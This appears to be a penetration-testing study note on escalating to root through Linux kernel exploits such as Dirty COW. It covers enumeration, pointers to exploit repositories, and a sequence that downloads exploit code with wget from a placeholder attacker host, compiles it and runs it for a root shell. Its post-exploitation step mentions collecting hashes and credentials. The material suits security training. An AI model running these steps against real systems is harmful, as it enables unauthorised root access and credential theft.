### 1. Technique Name:

Kernel Exploit Privilege Escalation
### 2. Summary:

Kernel exploits target vulnerabilities in the Linux kernel itself to escalate privileges to root. These are especially effective against unpatched or legacy systems. Exploits such as **Dirty COW** (CVE-2016-5195) are well-known for granting root-level access by exploiting race conditions or memory corruption in kernel code. These exploits often require compiling and executing a proof-of-concept (PoC) binary on the target.
### 3. Conditions / Requirements:

- Low-privileged shell access on the target
- Target is running a vulnerable, unpatched kernel version
- Ability to download and compile C code (presence of `gcc`, or ability to transfer precompiled binary)
- Awareness of potential system instability when using kernel exploits
### 4. Enumeration:
#### A. Identify kernel version:

```bash
uname -a
```
#### B. Identify OS version (useful for exploit targeting):

```bash
cat /etc/lsb-release
```
#### C. Check for known exploits for kernel version:

Search online for:

```
"linux <kernel version> exploit site:exploit-db.com"
```

or use tools like:

- [searchsploit](https://github.com/offensive-security/exploitdb)    
- [Kernel Exploits GitHub repo](https://github.com/SecWiki/linux-kernel-exploits)
### 5. Exploitation:
#### A. Transfer exploit to system:

```bash
wget http://<attacker-ip>/exploit.c -O kernel_exploit.c
```
#### B. Compile the exploit:

```bash
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```
#### C. Execute exploit:

```bash
./kernel_exploit
```
#### D. Root shell (if successful):

```bash
whoami
# root
```
### 6. Post-Exploitation:

- Confirm root:

```bash
id
```
 
- Collect system info, hashes, and credentials 
- Clean up dropped files if persistence isn't required 
- Patch the system if part of internal remediation
### Example:

```bash
uname -a
# Linux NIX02 4.4.0-116-generic #140-Ubuntu

cat /etc/lsb-release
# DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

wget http://<attacker-ip>/exploit.c -O kernel_exploit.c
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit

# [ PoC output ]
# spawning root shell

whoami
# root
```
